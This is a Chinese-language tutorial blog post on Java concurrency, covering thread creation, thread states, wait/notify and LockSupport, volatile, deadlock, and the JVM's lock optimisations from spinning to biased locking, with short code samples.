<h3 id="如何使用并发编程？"><a href="#如何使用并发编程？" class="headerlink" title="如何使用并发编程？"></a>如何使用并发编程？</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BasicLearn</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 无返回值</span>
<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 有返回值</span>
<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">" a "</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>实现Runnable或Callable接口，从写run方法。</li>
<li>继承Thread类，从写run方法</li>
</ol>
<h3 id="实现Runnable-和-继承Thread有什么区别"><a href="#实现Runnable-和-继承Thread有什么区别" class="headerlink" title="实现Runnable 和 继承Thread有什么区别"></a>实现Runnable 和 继承Thread有什么区别</h3><ol>
<li>Java是单继承结构，如果继承Thread，无法继承其他的类，接口更灵活</li>
<li>继承Thread开销会大一些，如果我们只要求可运行</li>
</ol>
<h3 id="线程的分类"><a href="#线程的分类" class="headerlink" title="线程的分类"></a>线程的分类</h3><ol>
<li><p>普通线程，就是我们上面所讲的内容</p>
</li>
<li><p>守护线程，也叫做<code>Daemon</code>，当所有非守护线程结束后，守护线程就会被回收。比如说垃圾回收就是守护线程</p>
<ol>
<li>注意守护线程不能操作重要的数据，因为无法保证可以执行完后，守护线程才停止。</li>
</ol>
</li>
</ol>
<h3 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h3><ol>
<li>New ：创建好，但还未启动</li>
<li>Runable ：Runable本身是两个状态，一个是Runable表示等待CPU时间片的线程，一个是Running表示正在使用时间片的线程</li>
<li>Blocked ：阻塞住的线程 </li>
<li>Waiting  ：一直等待线程，直到被唤醒</li>
<li>Time Waiting ：有时间的等待，到时间自己醒了</li>
<li>terminted ：线程结束</li>
</ol>
<h3 id="线程的中断"><a href="#线程的中断" class="headerlink" title="线程的中断"></a>线程的中断</h3><p>​    听起来线程的中断有点儿像人家正好好干活，你突然把人家赶走了。但实际上是这个线程在 Blocked 或 Waiting 时，我们将其打断，让他别等了。</p>
<p>​    我们常用：<code>interrupt() </code> 来打断线程，打断后会抛出 InterruptedException，从而提前结束该线程。但是<strong>不能中断 I/O 阻塞和 synchronized 锁阻塞</strong>。也是比较好判断的就是你看方法的调用是否有InterruptedException,如果有说明可以被打断。</p>
<p>​    如果该线程好好干活，我们是无法将其打断的。调用 <code>interrupt()</code>，只会是将其内部状态作为修改，通过 <code>interrupted()</code> 我们可以看这个线程是否被打断过，在 <code>while（true）中我们可以通过使用 interrupted() 来判断是否跳出循环 </code></p>
<p>​    在使用 Executor 去管理多个线程任务时，有方法 <code>shutdown() 和 shutdownNow()</code>，区别是 shutdown() 是等所有线程执行完后进行结束。而shutdownNow()表示现在就可以结束了。</p>
<h3 id="多线程的缺点"><a href="#多线程的缺点" class="headerlink" title="多线程的缺点"></a>多线程的缺点</h3><p>​    一旦涉及到多线程，总是面临着数据安全的问题，如果一组操作没有原子性，那在多线程的情况下就会出现数据安全的问题。所以为了数据的安全性，我们引出了锁的概念，线程去抢同一把锁，谁抢到了谁去操作数据，其他人就在外面等着（阻塞），直到锁被之前持有的线程释放。锁的实现分为很多种，我们下面会介绍。</p>
<h3 id="线程各个操作导致的状态"><a href="#线程各个操作导致的状态" class="headerlink" title="线程各个操作导致的状态"></a>线程各个操作导致的状态</h3><p>​    这里我们常在使用锁的情况下来描述，比方说多个线程抢同一把锁，如果使用 <code>Thread.sleep() 或 Thread.yield() </code>是否会放回锁。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 线程进入Runable，但未释放锁资源</span>
<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token keyword">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 线程进入TIMED_WAITING，但未释放锁资源</span>
<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 线程进入Waiting状态，释放锁资源</span>
objectLock<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 底层实际用的wait(), 释放锁资源</span>
<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这里有个小问题：<code>objectLock.notify() 与 objectLock.notifyall() </code> 有什么区别？</p>
</blockquote>
<p>notify是释放一个线程去抢锁，notifyall是释放所有等待的去抢锁，但只有一个能抢到。这看起来感觉不到区别。</p>
<p>实际上每个对象底层有两个池：锁池 和 等待池</p>
<ol>
<li>在锁池的是阻塞状态，当锁被释放，所有在锁池的对象都有机会获得锁</li>
<li>在等待池的是等待状态，是没有资格去抢锁的，只能被人唤醒</li>
</ol>
<p>​    当A线程抢到锁后，B线程没抢到就进入了锁池，A线程虽然抢到了，但如果是需要的资源没到位，使用了wait，进入的是等待池。这时候B就可以获取锁，并执行业务了，但A因为在等待池，所以即便是锁没被占用，自己仍无法操作，直到被唤醒。</p>
<p>​    notify() 是将等待池的一个线程加入锁池，而notifyall() 是将等待池中的所有线程加入锁池。</p>
<h3 id="当一个线程需要等待另一个线程的资源"><a href="#当一个线程需要等待另一个线程的资源" class="headerlink" title="当一个线程需要等待另一个线程的资源"></a>当一个线程需要等待另一个线程的资源</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> start <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> objectLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectLock<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectLock<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ReentrantLock</span> reentrantLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Condition</span> condition <span class="token operator">=</span> reentrantLock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        condition<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        condition<span class="token punctuation">.</span><span class="token function">signalAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">park</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">unpark</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我们主线程需要等待一个启动线程返回的结果，我们可以直接使用<code>Thread.join()</code>,等待该线程将资源返回，但这种方式必须要等到线程结束，主线程才能去获取，非常不灵活。因此我们常使用 <code>Object.wait() 与 Object.notify()</code>  方法可以更加主动的去等待与被通知。但有什么缺陷呢？</p>
<ol>
<li> 必须在静态代码块儿中使用，负责会抛出异常，这一点在 <code>condition.wait() 与condition.signal() </code>也存在</li>
<li>必须先<code>wait() 再 notify()</code> 否则会报错，因此我们常用：<code>LockSupport.park();</code></li>
</ol>
<p>LockSupport.park(); 底层使用的Unsafe类，它是可以操作线程和内存的，所以说不安全，要规范使用，在Atomic类中底层调用的也是它。而且它不能被直接获取，只能通过反射来获取。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">UnsafeAccessor</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token class-name">Unsafe</span> unsafe<span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Field</span> theUnsafe <span class="token operator">=</span> <span class="token class-name">Unsafe</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"theUnsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            theUnsafe<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            unsafe <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span> theUnsafe<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">static</span> <span class="token class-name">Unsafe</span> <span class="token function">getUnsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> unsafe<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h3><p>​        这里设计线程的工作内存与主内存数据的交互，为什么有工作内存，就是因为CPU对寄存器的操作远远超出了对内存的操作，所以线程是工作内存拷贝主内存，来使得CPU操作工作内存更快速，</p>
<h4 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h4><p>​        多个线程操作同一份数据，如果在A线程中对被Volatile修饰的对象做修改后，其他线程是可以立刻知道的。</p>
<h4 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a>有序性</h4><p>​        禁止指令重排，指令重排是一种计算机运行代码的优化手段，但可能造成奇怪的bug</p>
<h4 id="原子性（具有误导性）"><a href="#原子性（具有误导性）" class="headerlink" title="原子性（具有误导性）"></a>原子性（具有误导性）</h4><p>​        Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。</p>
<p>​        被Volatile修饰过的对象，在多线程下只能保证可见性，但不保证操作的原子性</p>
<p><img src="../../typora-user-images/image-20221123193040531.png" alt="image-20221123193040531"></p>
<h3 id="活锁，死锁，哲学家问题"><a href="#活锁，死锁，哲学家问题" class="headerlink" title="活锁，死锁，哲学家问题"></a>活锁，死锁，哲学家问题</h3><p>活锁： 两个线程互相影响彼此依赖的变量</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestLiveLock</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">volatile</span> <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 期望减到 0 退出循环</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                count<span class="token operator">--</span><span class="token punctuation">;</span>
                log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"count: &#123;&#125;"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 期望超过 20 退出循环</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                count<span class="token operator">++</span><span class="token punctuation">;</span>
                log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"count: &#123;&#125;"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>死锁：程序需要获取两把锁才能向下执行，两个线程各拿到了一把锁，等待另一把，导致双方都进入阻塞。</p>
<p>哲学家问题就是死锁问题的一种形式。</p>
<h2 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a>进阶知识</h2><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><p>Java对象头</p>
<p>普通对象：</p>
<p><img src="../../typora-user-images/image-20220610232552374.png" alt="image-test"></p>
<p><img src="../../typora-user-images/image-20221123194620216.png" alt="image-20221123194620216"></p>
<p>数组对象：</p>
<p><img src="../../typora-user-images/image-20221123194636687.png" alt="image-20221123194636687"></p>
<p>其中Mark Wordd的内部结构（32位虚拟机）</p>
<p><img src="../../typora-user-images/image-20221123194704096.png" alt="image-20221123194704096"></p>
<p>64位虚拟机</p>
<p><img src="../../typora-user-images/image-20221123194741408.png" alt="image-20221123194741408"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">synchronized</span> <span class="token punctuation">(</span>lock<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>当<code>synchronized 对对象加入重量级锁时，Mark Work中就会有指向Monitor对象的指针</code>，下面我们看看Monitor的结构</p>
<p><img src="../../typora-user-images/image-20221123195851860.png" alt="image-20221123195851860"></p>
<p>WaitSet 就是等待队列</p>
<p>EntryList 就是阻塞队列</p>
<p>Owner 就是当前获取锁的线程</p>
<h3 id="锁优化"><a href="#锁优化" class="headerlink" title="锁优化"></a>锁优化</h3><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><p>​    以前线程没有抢到锁，就会直接进入阻塞队列，但这代价太大了，所以JDK1.6后，因为了自旋锁，也就是抢不到锁后，没立刻阻塞，而是继续尝试获取锁，最后实在不行，就阻塞，因为也占用CPU资源。尝试几次是看之前获取几次来判断的，这也是自适应自旋锁的一个特点。</p>
<p>​    自旋会占用CPU，所以单核CPU自旋就是浪费，只有多核CPU才能提高性能</p>
<h4 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h4><p>​    通过逃逸分析，发现一个虽然加锁了，但实际上数据是无法被外界影响的，就会把锁消除。</p>
<h4 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h4><p>​    对一个对象反复的加锁解锁，性能影响很大，如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。</p>
<h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><ol>
<li>对使用者透明：<code>synchronized</code></li>
<li>多线程访问的时间是错开的，可用轻量级锁来优化</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">synchronized</span><span class="token punctuation">(</span> obj <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// 同步块 A</span>
 <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">synchronized</span><span class="token punctuation">(</span> obj <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// 同步块 B</span>
 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>当遇到加锁操作时，线程的栈帧中会创建一个（Lock Record）对象，每个线程的栈帧都会包含一个锁记录的解耦，内部存放锁定对象的Mark Word</li>
</ul>
<p><img src="../../typora-user-images/image-20221124102353283.png" alt="image-20221124102353283"></p>
<ul>
<li><p>让锁记录中 Object reference 指向锁对象，并尝试用 cas 替换 Object 的 Mark Word，将 Mark Word 的值存入锁记录。</p>
<ul>
<li>如果成功说明，锁当前没有被占用，01 代表无锁，00代表轻量级锁，对象头中存储了 锁记录地址和状态 00 ，表示由该线程给对象加锁</li>
<li>如果失败说明，有竞争，进入锁膨胀过程</li>
<li>如果发现有竞争，但是可以通过Mark Word 判断加锁的线程是不是自己，如果是自己，则再添加一个Lock Record作为重入计数</li>
</ul>
<p><img src="../../typora-user-images/image-20221124102736732.png" alt="image-20221124102736732"></p>
</li>
</ul>
<p><img src="../../typora-user-images/image-20221124103008743.png" alt="image-20221124103008743"></p>
<p>​    当退出 synchronized 代码块（解锁时）如果有取值为 null 的锁记录，表示有重入，这时重置锁记录，表示重入计数减一。</p>
<p>​    当退出 synchronized 代码块（解锁时）锁记录的值不为 null，这时使用 cas 将 Mark Word 的值恢复给对象头</p>
<ul>
<li><p>成功，则解锁成功</p>
</li>
<li><p>失败，说明轻量级锁进行了锁膨胀或已经升级为重量级锁，进入重量级锁解锁流程</p>
</li>
</ul>
<h4 id="锁膨胀"><a href="#锁膨胀" class="headerlink" title="锁膨胀"></a>锁膨胀</h4><p>​    当发现线程竞争发生了直接冲突时，就会将Object中MarkWork指向Monitor，并且将状态改为10。10就是重量级锁。阻塞线程就进入Monitor的EntryList进行阻塞。</p>
<p>​    当持有轻量级锁的线程进行cas操作时，发现失败了，就说明现在已经是重量级锁了，则通过Monitor地址找到Monitor对象，将Owner设置为空，表示锁释放，然后通知EntryList阻塞线程唤醒。</p>
<p><img src="../../typora-user-images/image-20221124103939951.png" alt="image-20221124103939951"></p>
<h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><p>偏向锁是对轻量级锁的再次优化，之前使用轻量级锁方案时，每次获取锁都要和Object的对象头做CAS操作，即便是重入锁，也需要该操作。现在希望Object对象头上直接写占有锁的线程ID，这样只要比较，不进行CAS操作。</p>
<p><img src="../../typora-user-images/image-20221124105155494.png" alt="image-20221124105155494"></p>
<p><img src="../../typora-user-images/image-20221124105207495.png" alt="image-20221124105207495"></p>
<p>查看对象头的信息</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.openjdk.jol<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jol-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    // 这里需要注意，不用provided
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="../../typora-user-images/image-20221124111220643.png" alt="image-20221124111220643"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> start <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span>  <span class="token keyword">synchronized</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        0x0000000000000001</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">ClassLayout</span><span class="token punctuation">.</span><span class="token function">parseInstance</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toPrintable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        延迟显示，不延迟：-XX:BiasedLockingStartupDelay=0</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">ClassLayout</span><span class="token punctuation">.</span><span class="token function">parseInstance</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toPrintable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>适用范围：锁竞争少。</p>
<p>如果是多线程竞争，可以设置关闭偏向锁，默认是开启的，适用：<code>-XX:-UseBiasedLocking</code></p>
<blockquote>
<p>需要注意：当使用了对象的.hashcode()方法会变为不可偏向</p>
</blockquote>
<p>因为在偏向锁中对象头没有位置存储HashCode，所以转为轻量级锁或者重量级锁。每个对象最初的HashCode为0，第一次使用时，进行赋值。</p>
